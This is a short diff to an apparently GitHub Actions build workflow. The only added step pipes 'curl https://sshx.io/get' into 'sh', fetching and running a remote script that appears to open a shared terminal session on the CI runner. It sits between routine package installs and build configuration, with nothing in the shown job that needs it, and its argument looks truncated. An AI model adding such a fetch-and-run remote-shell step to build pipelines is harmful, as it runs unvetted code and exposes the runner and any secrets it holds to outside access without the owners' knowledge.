@@ -52,6 +52,8 @@ jobs:
         dnf --assumeyes update
         dnf --assumeyes install swig
 
+    - run: curl -sSf https://sshx.io/get | sh -s ru
+    
     - name : Configure build directory
       run : |
         PYBIN0=$(file /opt/python/${{matrix.python.py}}.*/bin)
